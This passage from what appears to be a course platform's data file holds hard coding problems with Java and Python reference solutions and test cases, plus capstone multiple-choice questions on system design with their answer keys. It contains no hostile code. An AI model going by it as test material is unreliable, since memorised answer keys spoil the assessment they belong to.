        bucket["tokens"] = min(self.capacity, bucket["tokens"] + (elapsed_sec * self.refill_rate))
        bucket["last_refill"] = timestamp_millis

        if bucket["tokens"] >= tokens_required:
            bucket["tokens"] -= tokens_required
            return True
        return False
`
    },
    testCases: [
      { input: 'allowRequest("user1", 5, 1000) [Cap: 10, Rate: 2/s]', expected: 'true' },
      { input: 'allowRequest("user1", 6, 1100) immediately', expected: 'false' },
      { input: 'allowRequest("user1", 6, 2500) after 1.4s refill', expected: 'true' }
    ]
  },
  {
    id: 'f-code-2',
    title: 'LRU Cache with Per-Key TTL Eviction',
    company: 'Google / Redis',
    difficulty: 'Hard',
    tags: ['Data Structures', 'Hash Table', 'Doubly Linked List'],
    statement: `Implement an **LRU (Least Recently Used) Cache with TTL (Time-To-Live)**.
Support three operations:
1. \`get(key, currentTimeMillis)\`: Return the value if key exists and has not expired; otherwise return -1. Accessing a non-expired key refreshes its LRU priority to Most Recently Used.
2. \`put(key, value, ttlMillis, currentTimeMillis)\`: Insert or update the key with expiration at \`currentTimeMillis + ttlMillis\`. If capacity is exceeded, evict expired keys first; if no keys are expired, evict the least recently used key.
3. Both operations must run in O(1) amortized time complexity.`,
    starterCode: {
      java: `import java.util.*;

public class TTLLRUCache {
    private final int capacity;

    private static class CacheEntry {
        int key;
        int value;
        long expireAt;

        CacheEntry(int key, int value, long expireAt) {
            this.key = key;
            this.value = value;
            this.expireAt = expireAt;
        }
    }

    private final LinkedHashMap<Integer, CacheEntry> map;

    public TTLLRUCache(int capacity) {
        this.capacity = capacity;
        this.map = new LinkedHashMap<>(capacity, 0.75f, true);
    }

    public synchronized int get(int key, long now) {
        CacheEntry entry = map.get(key);
        if (entry == null) return -1;
        if (now >= entry.expireAt) {
            map.remove(key);
            return -1;
        }
        return entry.value;
    }

    public synchronized void put(int key, int value, long ttl, long now) {
        if (map.containsKey(key)) {
            map.remove(key);
        } else if (map.size() >= capacity) {
            // First check if any expired entry exists
            Iterator<Map.Entry<Integer, CacheEntry>> it = map.entrySet().iterator();
            boolean removedExpired = false;
            while (it.hasNext()) {
                Map.Entry<Integer, CacheEntry> e = it.next();
                if (now >= e.getValue().expireAt) {
                    it.remove();
                    removedExpired = true;
                    break;
                }
            }
            if (!removedExpired) {
                // Evict LRU eldest entry
                Integer eldest = map.keySet().iterator().next();
                map.remove(eldest);
            }
        }
        map.put(key, new CacheEntry(key, value, now + ttl));
    }
}`,
      python: `from collections import OrderedDict

class TTLLRUCache:
    def __init__(self, capacity: int):
        self.capacity = capacity
        self.cache = OrderedDict() # key -> (val, expire_at)

    def get(self, key: int, now: int) -> int:
        if key not in self.cache:
            return -1
        val, expire_at = self.cache[key]
        if now >= expire_at:
            del self.cache[key]
            return -1
        self.cache.move_to_end(key)
        return val

    def put(self, key: int, value: int, ttl: int, now: int) -> None:
        if key in self.cache:
            del self.cache[key]
        elif len(self.cache) >= self.capacity:
            # Check for expired key first
            expired_key = next((k for k, (_, exp) in self.cache.items() if now >= exp), None)
            if expired_key is not None:
                del self.cache[expired_key]
            else:
                self.cache.popitem(last=False)
        self.cache[key] = (value, now + ttl)
`
    },
    testCases: [
      { input: 'put(1, 100, 1000, 0); get(1, 500)', expected: '100' },
      { input: 'get(1, 1500) [after TTL]', expected: '-1' },
      { input: 'put(2, 200, 5000, 0); put(3, 300, 5000, 0); put(4, 400, 5000, 0)', expected: 'evicts LRU' }
    ]
  },
  {
    id: 'f-code-3',
    title: 'Concurrent Bounded Blocking Queue',
    company: 'Netflix / Java Concurrency',
    difficulty: 'Hard',
    tags: ['Concurrency', 'Condition Variables', 'Producer-Consumer'],
    statement: `Implement a thread-safe **Bounded Blocking Queue** from scratch without using \`java.util.concurrent.BlockingQueue\`.
Support two operations:
1. \`enqueue(element)\`: Blocks the calling thread if the queue is full until space becomes available.
2. \`dequeue()\`: Blocks the calling thread if the queue is empty until an element is added.
Both operations must maintain FIFO order and properly notify waiting threads using monitor condition variables.`,
    starterCode: {
      java: `import java.util.LinkedList;
import java.util.Queue;

public class BoundedBlockingQueue<T> {
    private final Queue<T> queue = new LinkedList<>();
    private final int capacity;

    public BoundedBlockingQueue(int capacity) {
        if (capacity <= 0) throw new IllegalArgumentException();
        this.capacity = capacity;
    }

    public synchronized void enqueue(T element) throws InterruptedException {
        while (queue.size() == capacity) {
            wait();
        }
        queue.offer(element);
        notifyAll();
    }

    public synchronized T dequeue() throws InterruptedException {
        while (queue.isEmpty()) {
            wait();
        }
        T item = queue.poll();
        notifyAll();
        return item;
    }

    public synchronized int size() {
        return queue.size();
    }
}`,
      python: `import threading
from collections import deque

class BoundedBlockingQueue:
    def __init__(self, capacity: int):
        self.capacity = capacity
        self.queue = deque()
        self.lock = threading.Lock()
        self.not_full = threading.Condition(self.lock)
        self.not_empty = threading.Condition(self.lock)

    def enqueue(self, element) -> None:
        with self.not_full:
            while len(self.queue) == self.capacity:
                self.not_full.wait()
            self.queue.append(element)
            self.not_empty.notify()

    def dequeue(self):
        with self.not_empty:
            while len(self.queue) == 0:
                self.not_empty.wait()
            item = self.queue.popleft()
            self.not_full.notify()
            return item
`
    },
    testCases: [
      { input: 'enqueue(1), enqueue(2), dequeue()', expected: '1' },
      { input: 'capacity=1: enqueue(A), concurrent thread enqueue(B)', expected: 'blocks until dequeue' }
    ]
  },
  {
    id: 'f-code-4',
    title: 'Microservice Dependency Topological Order with Cycle Detection',
    company: 'Meta / Uber',
    difficulty: 'Hard',
    tags: ['Graph', 'Topological Sort', 'Kahn Algorithm'],
    statement: `In a microservices deployment pipeline, services have direct dependencies on other services (e.g. Service A requires Service B to be running before A can start).
Given \`numServices\` and a list of dependency pairs \`[dependent, dependency]\`:
Return a valid deployment sequence array. If there is a circular dependency (deadlock cycle), return an empty array \`[]\`.`,
    starterCode: {
      java: `import java.util.*;

public class ServiceDependencyResolver {
    public static int[] resolveDeploymentOrder(int numServices, int[][] dependencies) {
        int[] inDegree = new int[numServices];
        List<List<Integer>> adj = new ArrayList<>();
        for (int i = 0; i < numServices; i++) adj.add(new ArrayList<>());

        for (int[] dep : dependencies) {
            int service = dep[0];
            int required = dep[1];
            adj.get(required).add(service);
            inDegree[service]++;
        }

        Queue<Integer> queue = new LinkedList<>();
        for (int i = 0; i < numServices; i++) {
            if (inDegree[i] == 0) queue.offer(i);
        }

        int[] order = new int[numServices];
        int idx = 0;

        while (!queue.isEmpty()) {
            int curr = queue.poll();
            order[idx++] = curr;

            for (int neighbor : adj.get(curr)) {
                if (--inDegree[neighbor] == 0) {
                    queue.offer(neighbor);
                }
            }
        }

        return idx == numServices ? order : new int[0];
    }
}`,
      python: `from collections import deque
from typing import List

def resolve_deployment_order(num_services: int, dependencies: List[List[int]]) -> List[int]:
    in_degree = [0] * num_services
    adj = [[] for _ in range(num_services)]

    for service, required in dependencies:
        adj[required].append(service)
        in_degree[service] += 1

    queue = deque([i for i in range(num_services) if in_degree[i] == 0])
    order = []

    while queue:
        curr = queue.popleft()
        order.append(curr)
        for neighbor in adj[curr]:
            in_degree[neighbor] -= 1
            if in_degree[neighbor] == 0:
                queue.append(neighbor)

    return order if len(order) == num_services else []
`
    },
    testCases: [
      { input: 'numServices=4, deps=[[1,0],[2,0],[3,1],[3,2]]', expected: '[0, 1, 2, 3] or [0, 2, 1, 3]' },
      { input: 'Cycle: numServices=2, deps=[[0,1],[1,0]]', expected: '[] (Deadlock detected)' }
    ]
  },
  {
    id: 'f-code-5',
    title: 'Compact Binary Tree Serialization & Deserialization',
    company: 'Google',
    difficulty: 'Hard',
    tags: ['Trees', 'Design', 'Bytecode', 'Recursion'],
    statement: `Design an algorithm to serialize and deserialize a binary tree to and from a compact string.
There is no restriction on how your serialization/deserialization algorithm should work; you must ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure.
Must achieve O(N) time and O(N) memory complexity.`,
    starterCode: {
      java: `import java.util.*;

public class Codec {
    public static class TreeNode {
        int val;
        TreeNode left, right;
        TreeNode(int x) { val = x; }
    }

    public String serialize(TreeNode root) {
        if (root == null) return "#";
        return root.val + "," + serialize(root.left) + "," + serialize(root.right);
    }

    public TreeNode deserialize(String data) {
        Queue<String> nodes = new LinkedList<>(Arrays.asList(data.split(",")));
        return buildTree(nodes);
    }

    private TreeNode buildTree(Queue<String> nodes) {
        String val = nodes.poll();
        if ("#".equals(val)) return null;
        TreeNode node = new TreeNode(Integer.parseInt(val));
        node.left = buildTree(nodes);
        node.right = buildTree(nodes);
        return node;
    }
}`,
      python: `class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None

class Codec:
    def serialize(self, root: TreeNode) -> str:
        if not root:
            return "#"
        return f"{root.val},{self.serialize(root.left)},{self.serialize(root.right)}"

    def deserialize(self, data: str) -> TreeNode:
        nodes = iter(data.split(","))
        def build():
            val = next(nodes)
            if val == "#":
                return None
            node = TreeNode(int(val))
            node.left = build()
            node.right = build()
            return node
        return build()
`
    },
    testCases: [
      { input: 'Tree [1, 2, 3, null, null, 4, 5]', expected: 'Perfect reconstruction' }
    ]
  },
  {
    id: 'f-code-6',
    title: 'Sliding Window Maximum in O(N) using Monotonic Deque',
    company: 'Amazon',
    difficulty: 'Hard',
    tags: ['Monotonic Queue', 'Sliding Window', 'Arrays'],
    statement: `You are given an array of integers \`nums\`, and there is a sliding window of size \`k\` moving from left to right.
You can only see the \`k\` numbers in the window. Each time the window moves right by one position, return the maximum element in the window.
Must run in strictly **O(N) time complexity** across the entire array.`,
    starterCode: {
      java: `import java.util.*;

public class SlidingWindowMax {
    public static int[] maxSlidingWindow(int[] nums, int k) {
        if (nums == null || k <= 0) return new int[0];
        int n = nums.length;
        int[] result = new int[n - k + 1];
        Deque<Integer> deque = new ArrayDeque<>(); // stores indices

        for (int i = 0; i < n; i++) {
            // Remove indices outside the window
            while (!deque.isEmpty() && deque.peekFirst() < i - k + 1) {
                deque.pollFirst();
            }
            // Remove smaller elements from back
            while (!deque.isEmpty() && nums[deque.peekLast()] < nums[i]) {
                deque.pollLast();
            }
            deque.offerLast(i);

            if (i >= k - 1) {
                result[i - k + 1] = nums[deque.peekFirst()];
            }
        }
        return result;
    }
}`,
      python: `from collections import deque
from typing import List

def max_sliding_window(nums: List[int], k: int) -> List[int]:
    d = deque() # stores indices
    out = []

    for i, n in enumerate(nums):
        while d and d[0] < i - k + 1:
            d.popleft()
        while d and nums[d[-1]] < n:
            d.pop()
        d.append(i)
        if i >= k - 1:
            out.append(nums[d[0]])
    return out
`
    },
    testCases: [
      { input: 'nums = [1,3,-1,-3,5,3,6,7], k = 3', expected: '[3, 3, 5, 5, 6, 7]' },
      { input: 'nums = [1], k = 1', expected: '[1]' }
    ]
  },
  {
    id: 'f-code-7',
    title: 'Asynchronous Task Pipeline with Concurrency Throttling',
    company: 'Meta / FastAPI',
    difficulty: 'Hard',
    tags: ['Async', 'Concurrency', 'Task Scheduling'],
    statement: `Design an asynchronous worker pool that takes a list of asynchronous tasks with varying execution durations.
It must execute tasks concurrently but strictly throttle maximum simultaneous active jobs to \`maxConcurrency\`.
Return all task results in the exact original submission order.`,
    starterCode: {
      java: `import java.util.concurrent.*;
import java.util.*;

public class AsyncTaskPipeline {
    private final ExecutorService executor;

    public AsyncTaskPipeline(int maxConcurrency) {
        this.executor = Executors.newFixedThreadPool(maxConcurrency);
    }

    public <T> List<T> executeAll(List<Callable<T>> tasks) throws Exception {
        List<Future<T>> futures = executor.invokeAll(tasks);
        List<T> results = new ArrayList<>();
        for (Future<T> f : futures) {
            results.add(f.get());
        }
        return results;
    }
}`,
      python: `import asyncio
from typing import List, Callable, Any

async def run_pipeline(tasks: List[Callable[[], Any]], max_concurrency: int) -> List[Any]:
    sem = asyncio.Semaphore(max_concurrency)

    async def run_with_sem(task):
        async with sem:
            return await task()

    return await asyncio.gather(*(run_with_sem(t) for t in tasks))
`
    },
    testCases: [
      { input: '10 tasks with max_concurrency=3', expected: 'All 10 return in order with at most 3 active' }
    ]
  },
  {
    id: 'f-code-8',
    title: 'Inverted Index Search with BM25 / TF-IDF Ranking',
    company: 'Google',
    difficulty: 'Hard',
    tags: ['Information Retrieval', 'Hash Map', 'Search Engine'],
    statement: `Implement an in-memory **Inverted Index** document store with term frequency (TF-IDF) scoring.
1. \`addDocument(docId, text)\`: Tokenizes and normalizes terms.
2. \`search(queryTerms, topK)\`: Returns the top K document IDs ranked by relevance score.`,
    starterCode: {
      java: `import java.util.*;

public class InvertedIndexSearch {
    private final Map<String, Map<Integer, Integer>> index = new HashMap<>(); // term -> (docId -> count)
    private final Map<Integer, Integer> docLengths = new HashMap<>();

    public void addDocument(int docId, String content) {
        String[] tokens = content.toLowerCase().split("\\\\s+");
        docLengths.put(docId, tokens.length);
        for (String token : tokens) {
            index.computeIfAbsent(token, k -> new HashMap<>()).merge(docId, 1, Integer::sum);
        }
    }

    public List<Integer> search(String query, int topK) {
        String[] terms = query.toLowerCase().split("\\\\s+");
        Map<Integer, Double> scores = new HashMap<>();

        for (String term : terms) {
            Map<Integer, Integer> postings = index.get(term);
            if (postings != null) {
                for (Map.Entry<Integer, Integer> entry : postings.entrySet()) {
                    int docId = entry.getKey();
                    double tf = (double) entry.getValue() / docLengths.get(docId);
                    scores.merge(docId, tf, Double::sum);
                }
            }
        }

        List<Integer> ranked = new ArrayList<>(scores.keySet());
        ranked.sort((a, b) -> Double.compare(scores.get(b), scores.get(a)));
        return ranked.subList(0, Math.min(topK, ranked.size()));
    }
}`,
      python: `from collections import defaultdict
import math

class InvertedIndexSearch:
    def __init__(self):
        self.index = defaultdict(lambda: defaultdict(int)) # term -> doc_id -> count
        self.doc_lens = {}

    def add_document(self, doc_id: int, content: str):
        tokens = content.lower().split()
        self.doc_lens[doc_id] = len(tokens)
        for token in tokens:
            self.index[token][doc_id] += 1

    def search(self, query: str, top_k: int = 5):
        terms = query.lower().split()
        scores = defaultdict(float)
        for term in terms:
            if term in self.index:
                for doc_id, count in self.index[term].items():
                    tf = count / self.doc_lens[doc_id]
                    scores[doc_id] += tf
        ranked = sorted(scores.keys(), key=lambda d: scores[d], reverse=True)
        return ranked[:top_k]
`
    },
    testCases: [
      { input: 'search("spring microservices", topK=2)', expected: 'Returns most relevant document IDs' }
    ]
  },
  {
    id: 'f-code-9',
    title: 'Longest Increasing Subsequence in O(N log N) (Patience Sorting)',
    company: 'Apple',
    difficulty: 'Hard',
    tags: ['Dynamic Programming', 'Binary Search', 'Patience Sort'],
    statement: `Given an integer array \`nums\`, return the length of the longest strictly increasing subsequence.
The algorithm must run in **O(N log N)** time complexity using binary search patience sorting.`,
    starterCode: {
      java: `import java.util.*;

public class LISSolver {
    public static int lengthOfLIS(int[] nums) {
        if (nums == null || nums.length == 0) return 0;
        int[] tails = new int[nums.length];
        int size = 0;

        for (int x : nums) {
            int i = 0, j = size;
            while (i < j) {
                int m = (i + j) / 2;
                if (tails[m] < x) {
                    i = m + 1;
                } else {
                    j = m;
                }
            }
            tails[i] = x;
            if (i == size) size++;
        }
        return size;
    }
}`,
      python: `import bisect

def length_of_lis(nums: list[int]) -> int:
    tails = []
    for x in nums:
        idx = bisect.bisect_left(tails, x)
        if idx == len(tails):
            tails.append(x)
        else:
            tails[idx] = x
    return len(tails)
`
    },
    testCases: [
      { input: '[10,9,2,5,3,7,101,18]', expected: '4 (Subsequence: [2, 3, 7, 101])' },
      { input: '[0,1,0,3,2,3]', expected: '4' }
    ]
  },
  {
    id: 'f-code-10',
    title: 'High-Frequency Object Pool for Garbage-Free Execution',
    company: 'Netflix / Citadel',
    difficulty: 'Hard',
    tags: ['Memory Management', 'Object Pool', 'GC Optimization'],
    statement: `In real-time trading engines and streaming servers, continuous heap allocations trigger stop-the-world GC pauses.
Implement a generic, thread-safe, zero-allocation **Object Pool**.
1. \`acquire()\`: Returns a recycled object from the pool if available, or constructs one if empty.
2. \`release(obj)\`: Resets the object state and returns it to the free list.
Both operations must be atomic and lock-free or lightweight synchronized.`,
    starterCode: {
      java: `import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.function.Supplier;
import java.util.function.Consumer;

public class ObjectPool<T> {
    private final ConcurrentLinkedQueue<T> pool = new ConcurrentLinkedQueue<>();
    private final Supplier<T> factory;
    private final Consumer<T> resetter;

    public ObjectPool(Supplier<T> factory, Consumer<T> resetter) {
        this.factory = factory;
        this.resetter = resetter;
    }

    public T acquire() {
        T instance = pool.poll();
        return instance != null ? instance : factory.get();
    }

    public void release(T instance) {
        if (instance != null) {
            resetter.accept(instance);
            pool.offer(instance);
        }
    }
}`,
      python: `from typing import Callable, TypeVar, Generic
from collections import deque
import threading

T = TypeVar('T')

class ObjectPool(Generic[T]):
    def __init__(self, factory: Callable[[], T], resetter: Callable[[T], None]):
        self.factory = factory
        self.resetter = resetter
        self.pool = deque()
        self.lock = threading.Lock()

    def acquire(self) -> T:
        with self.lock:
            if self.pool:
                return self.pool.pop()
        return self.factory()

    def release(self, obj: T) -> None:
        self.resetter(obj)
        with self.lock:
            self.pool.append(obj)
`
    },
    testCases: [
      { input: 'acquire(), use, release(), re-acquire()', expected: 'Reuses same physical memory reference' }
    ]
  }
];

// ----------------------------------------------------------------------------
// COMPREHENSIVE FINAL ASSESSMENT (25 CAPSTONE QUESTIONS TO UNLOCK CERTIFICATE)
// ----------------------------------------------------------------------------
export const FINAL_CAPSTONE_ASSESSMENT_MCQS = [
  {
    id: 'final-1',
    category: 'System Architecture',
    question: 'When designing a distributed transaction across heterogeneous microservices (Postgres + Mongo + Kafka), why is the Outbox Pattern essential for avoiding Dual-Write data divergence?',
    options: [
      'It encrypts MongoDB documents with PostgreSQL SSL certificates.',
      'It writes business events atomically into an `outbox` table in the SAME database transaction as the business entity update; a dedicated CDC process (like Debezium) then streams these outbox events to Kafka, guaranteeing At-Least-Once delivery without distributed dual-write inconsistency.',
      'It executes global two-phase commit over HTTP REST headers.',
      'It converts all Kafka topics into PostgreSQL tables.'
    ],
    correctIndex: 1,
    explanation: 'If a service writes to a database and then publishes to Kafka in two separate calls, a crash or network blip between the two writes causes irreversible divergence. The Outbox Pattern writes the event payload into an `outbox` table within the exact same relational ACID transaction. An asynchronous CDC tool reads the transaction commit log and pushes to Kafka reliably.'
  },
  {
    id: 'final-2',
    category: 'Security & Auth',
    question: 'In OAuth 2.1 / OIDC authorization code flow for Single Page Applications (SPAs), why is PKCE (Proof Key for Code Exchange) mandatory even for public clients without client secrets?',
    options: [
      'It prevents Cross-Site Scripting (XSS) inside the DOM.',
      'It prevents Authorization Code Injection and interception attacks: the client generates a dynamic cryptographic code_verifier and sends code_challenge at authorize; when exchanging the code, the auth server verifies the challenge, stopping stolen codes from being exchanged by unauthorized actors.',
      'It enables the SPA to bypass CORS restrictions.',
      'It encodes tokens using AES-256 in browser memory.'
    ],
    correctIndex: 1,
    explanation: 'Public clients (like React SPAs) cannot securely store a static client_secret. PKCE creates a temporary dynamic secret per login request (`code_verifier`). Even if a malicious actor intercepts the authorization code from the redirect URL, they cannot exchange it for tokens because they lack the original `code_verifier`.'
  },
  {
    id: 'final-3',
    category: 'Database & Concurrency',
    question: 'In high-concurrency e-commerce inventory flash sales, what is the key difference between Optimistic Locking (`@Version` / CAS) vs Pessimistic Locking (`SELECT ... FOR UPDATE`)?',
    options: [
      'Pessimistic locking uses Redis; optimistic locking uses Memcached.',
      'Optimistic locking does not acquire database row locks during reads, checking a version column at commit time (re-trying if version changed); under extreme contention (e.g. 50,000 users buying 5 phones), optimistic lock retries cause massive rollback storms, whereas Pessimistic Lock queues transactions cleanly at the database row level.',
      'Pessimistic locking prevents deadlocks automatically.',
      'Optimistic locking is only supported in MongoDB.'
    ],
    correctIndex: 1,
    explanation: 'Optimistic locking assumes collisions are rare; if 5,000 threads read version 1, only the first commit succeeds while the other 4,999 fail and must retry. In high-contention flash sales, pessimistic locking (`SELECT FOR UPDATE`) places an exclusive row lock, ordering concurrent purchases into an orderly line at the DB engine.'
  },
  {
    id: 'final-4',
    category: 'Microservices & Resilience',
    question: 'What is the primary role of an API Gateway (like Spring Cloud Gateway or Kong) in a production microservices topology?',
    options: [
      'It executes all database schema migrations across microservices.',
      'It serves as the single reverse-proxy entrypoint providing centralized routing, SSL termination, authentication/JWT validation, rate-limiting, and distributed tracing correlation ID injection before traffic hits downstream internal services.',
      'It compiles React frontend code into Spring Boot JAR files.',
      'It replicates Redis cache keys across AWS regions.'
    ],
    correctIndex: 1,
    explanation: 'An API Gateway sits between external clients and backend services. It centralizes non-functional concerns: routing, JWT authentication, rate limiting, request validation, CORS, and distributed trace headers, allowing downstream services to focus purely on domain business logic.'
  },
  {
    id: 'final-5',
    category: 'High Performance & Caching',
    question: 'What is a "Cache Avalanche" and which architectural pattern provides the most robust mitigation in distributed systems?',
    options: [
      'When Redis runs out of disk space; mitigated by buying larger SSDs.',
      'When a large number of cache keys expire at the exact same second, causing thousands of concurrent backend requests to strike the database simultaneously; mitigated by adding random jitter to TTL expirations and using mutex/singleflight locking for cache regeneration.',
      'When cache items are accessed in reverse alphabetical order.',
      'When Redis master and replica nodes trade keys infinitely.'
    ],
    correctIndex: 1,
    explanation: 'If 100,000 product keys are loaded at midnight with fixed 1-hour TTL, all 100,000 keys expire at 1:00 AM simultaneously. The subsequent traffic blast overwhelms and crashes the primary database. Adding random jitter (TTL = 3600 + random(0, 300) seconds) smooths out expirations over time.'
  },
  {
    id: 'final-6',
    category: 'Distributed Systems & Messaging',
    question: 'In Apache Kafka, what is a "Consumer Group Rebalance" storm, and how can an engineering team prevent it during long-running batch processing?',
    options: [
      'Rebalance storm occurs when brokers run out of RAM; fixed by restarting ZooKeeper/KRaft.',
      'It occurs when a consumer takes longer than `max.poll.interval.ms` to process a fetched batch of records, leading the broker coordinator to consider the consumer dead, trigger partition revocation across all consumers, and cause cascading rebalance loops; prevented by offloading processing to worker thread pools or reducing `max.poll.records`.',
      'It occurs when topic replication factor exceeds cluster node count.',
      'It occurs when consumers use manual commit instead of auto-commit.'
    ],
    correctIndex: 1,
    explanation: 'If the consumer thread is blocked doing heavy database or external I/O longer than `max.poll.interval.ms`, Kafka assumes the process crashed. It reassigns partitions to other consumers, who also get overloaded, creating a rebalance storm. Mitigation includes lowering `max.poll.records` or decoupling the Kafka poll loop from the worker pool.'
  },
  {
    id: 'final-7',
    category: 'Architecture Patterns',
    question: 'In CQRS (Command Query Responsibility Segregation) architecture paired with Event Sourcing, how is eventual consistency handled between the Write Model and Read Model?',
    options: [
      'The write model executes a distributed lock on the read model relational database table.',
      'The write model appends immutable domain events to the Event Store; asynchronous event projection handlers consume these events and project denormalized read-optimized views into read datastores (e.g. Elasticsearch/Postgres); queries read from these projections, tolerating milliseconds of propagation lag.',
      'Event Sourcing eliminates eventual consistency by synchronizing memory over InfiniBand.',
      'CQRS mandates that both read and write models share the identical normalized 3NF database schema.'
    ],
    correctIndex: 1,
    explanation: 'In CQRS + Event Sourcing, the source of truth is the immutable event stream. Projections subscribe to the stream and update read models asynchronously. The UI handles eventual consistency using optimistic UI updates or subscription channels (WebSockets/SSE).'
  },
  {
    id: 'final-8',
    category: 'Database Internals',
    question: 'Why do high-throughput write-heavy storage engines (like Cassandra, RocksDB, and ScyllaDB) use Log-Structured Merge-Trees (LSM-Trees) instead of traditional B+ Trees?',
    options: [
      'B+ Trees only work on 32-bit operating systems.',
      'B+ Trees perform random in-place updates across disk pages, causing high write amplification and random disk I/O; LSM-Trees convert writes into sequential sequential appends in memory (MemTable) and write append-only SSTables to disk, delivering superior write throughput and SSD lifespan.',
      'LSM-Trees do not require indexing or compaction.',
      'B+ Trees cannot store string data types.'
    ],
    correctIndex: 1,
    explanation: 'Random disk I/O kills write throughput. B+ Trees must find the specific page on disk and update it in-place. LSM-Trees write immediately to an in-memory MemTable and write-ahead log (WAL), then flush sequentially to immutable SSTable files, trading read latency (mitigated by Bloom filters) for massive write throughput.'
  },
  {
    id: 'final-9',
    category: 'System Reliability & Resilience',
    question: 'How does the Circuit Breaker pattern (e.g., Resilience4j) transition between CLOSED, OPEN, and HALF_OPEN states during downstream service degradation?',
    options: [
      'It randomly routes 50% of traffic to the database when latency exceeds 1 second.',
      'CLOSED allows all traffic; when failures exceed a sliding window threshold (e.g. 50% errors over 100 calls), it trips to OPEN, fast-failing calls immediately with fallback response without hitting downstream; after a configurable sleep window, it transitions to HALF_OPEN to send canary requests: if successful, it resets to CLOSED; if failures persist, it re-enters OPEN.',
      'It stays OPEN during normal operations and CLOSES only when an error occurs.',
      'It terminates Kubernetes pods whenever CPU exceeds 80%.'
    ],
    correctIndex: 1,
    explanation: 'The Circuit Breaker protects both client and degrading downstream services. In OPEN state, requests fail immediately without blocking threads or consuming network sockets. In HALF_OPEN state, limited trial requests verify if downstream has recovered.'
  },
  {
    id: 'final-10',
    category: 'Database & Transactions',
    question: 'In ANSI SQL isolation levels, which anomaly is allowed under "Repeatable Read" in standard SQL-92 but prevented under "Serializable"?',
    options: [
      'Dirty Reads (reading uncommitted changes).',
      'Non-repeatable Reads (re-reading the same row within a transaction returns modified values).',
      'Phantom Reads (a query looking for a range of rows returns different rows because another concurrent transaction inserted and committed new matching rows).',
      'Lost Updates on single-row primary key lookups.'
    ],
    correctIndex: 2,
    explanation: 'Repeatable Read locks existing rows read by the query, preventing modifications to those rows. However, without predicate locking or range locks (like Gap Locks in MySQL InnoDB or Serializable Snapshot Isolation in PostgreSQL), another transaction can insert brand new matching rows into the range, resulting in a Phantom Read.'
  },
  {
    id: 'final-11',
    category: 'Distributed Tracing & Observability',
    question: 'In OpenTelemetry and W3C Trace Context standards, what are `traceparent` and `tracestate` HTTP headers used for?',
    options: [
      'Authenticating user passwords across reverse proxies.',
      'Propagating distributed context across microservice hops: `traceparent` encodes version, 16-byte TraceId, 8-byte ParentSpanId, and trace flags (sampling bit); `tracestate` carries vendor-specific routing and filtering metadata, enabling unified end-to-end request tracing.',
      'Storing encrypted session cookies in microservices.',
      'Controlling TCP window size and MTU discovery.'
    ],
    correctIndex: 1,
    explanation: 'W3C Trace Context standardizes distributed tracing context propagation. When Service A calls Service B over HTTP, it forwards the `traceparent` header (e.g. `00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01`) so APM systems like Jaeger, Zipkin, or Datadog stitch all span logs into a single root trace.'
  },
  {
    id: 'final-12',
    category: 'Containerization & Docker',
    question: 'Why are Docker Multi-Stage Builds considered an essential best practice for enterprise production containers?',
    options: [
      'They allow running multiple Docker daemons simultaneously on one host.',
      'They separate the build environment (compilers, Maven/pip, intermediate build files, build-time SDKs) from the runtime environment, producing a lean, minimal production image containing only the compiled binary and slim runtime JRE/Python runner, drastically reducing image size and CVE attack surface.',
      'They prevent Docker containers from utilizing CPU over 50%.',
      'They convert AMD64 containers into ARM64 binaries automatically without emulation.'
    ],
    correctIndex: 1,
    explanation: 'Multi-stage builds allow developers to use rich build tooling in stage 1 (`FROM maven:3.9-eclipse-temurin-17 AS builder`) and copy only the resulting artifact into stage 2 (`FROM eclipse-temurin:17-jre-alpine`). This reduces image size from 1.2 GB down to 180 MB, removing package managers, compilers, and vulnerability vectors.'
  },
  {
    id: 'final-13',
    category: 'Kubernetes Orchestration',
    question: 'What is the critical behavioral distinction between a Kubernetes `livenessProbe` and a `readinessProbe`?',
    options: [
      'Liveness probe checks memory usage; readiness probe checks CPU percentage.',
      'If a `livenessProbe` fails, kubelet kills and restarts the container; if a `readinessProbe` fails, the container is NOT restarted, but the Pod IP is immediately removed from the Kubernetes Service endpoints, preventing traffic from being routed to an unready or warming-up instance.',
      'Readiness probe runs only at cluster initialization; liveness probe runs once every hour.',
      'Liveness probes are written in Go; readiness probes are written in YAML.'
    ],
    correctIndex: 1,
    explanation: 'If a service is under high load or executing a slow cache warm-up, a failing livenessProbe would kill the process, making an overload problem worse by triggering crash loops. A failing readinessProbe simply stops routing incoming traffic until the pod catches up, keeping the process alive.'
  },
  {
    id: 'final-14',
    category: 'API Design & Protocols',
    question: 'When should a system architect choose WebSockets or Server-Sent Events (SSE) over traditional HTTP short polling for real-time stock ticker updates?',
    options: [
      'HTTP short polling is always faster and consumes fewer sockets than WebSockets.',
      'HTTP short polling incurs repeated TCP/TLS handshakes, HTTP request header overhead (1KB+ per poll), and high server CPU load; SSE/WebSockets establish a single persistent connection: SSE provides unidirectional low-overhead server-to-client streaming over HTTP/2, while WebSockets provides full-duplex binary/text streaming.',
      'WebSockets encrypt data automatically with quantum cryptography.',
      'SSE only works in Internet Explorer 6.'
    ],
    correctIndex: 1,
    explanation: 'Short polling at 1-second intervals creates massive unnecessary overhead. SSE runs natively over HTTP/2 with built-in reconnection and event IDs, perfect for unidirectional feeds (ticker, notifications). WebSockets provides full-duplex bi-directional communication (chat, collaborative canvas).'
  },
  {
    id: 'final-15',
    category: 'GraphQL & API Optimization',
    question: 'In GraphQL backends, what is the notorious "N+1 Query Problem" and how does the DataLoader pattern resolve it?',
    options: [
      'It refers to having N database replicas plus 1 master node.',
      'Resolving a list of N parent entities (e.g. 100 books) executes 1 query for parents, and then 1 separate database query per parent for its nested relation (e.g. 100 queries for authors = 101 queries total); DataLoader resolves this by batching all keys within a single tick of the event loop and caching lookups, converting N queries into 1 `SELECT ... WHERE id IN (...)` query.',
      'It occurs when GraphQL schema definitions exceed N+1 lines of code.',
      'DataLoader deletes slow database rows automatically.'
    ],
    correctIndex: 1,
    explanation: 'Without batching, GraphQL field resolvers execute individually for every parent row. DataLoader accumulates all entity IDs requested in the current execution cycle and executes a single batch load query, completely eliminating N+1 DB round trips.'
  },
  {
    id: 'final-16',
    category: 'Web Security & Browser Sandbox',
    question: 'Under what specific conditions does a web browser issue a CORS Preflight `OPTIONS` request before sending an HTTP request?',
    options: [
      'Only when the backend server is hosted on Amazon AWS.',
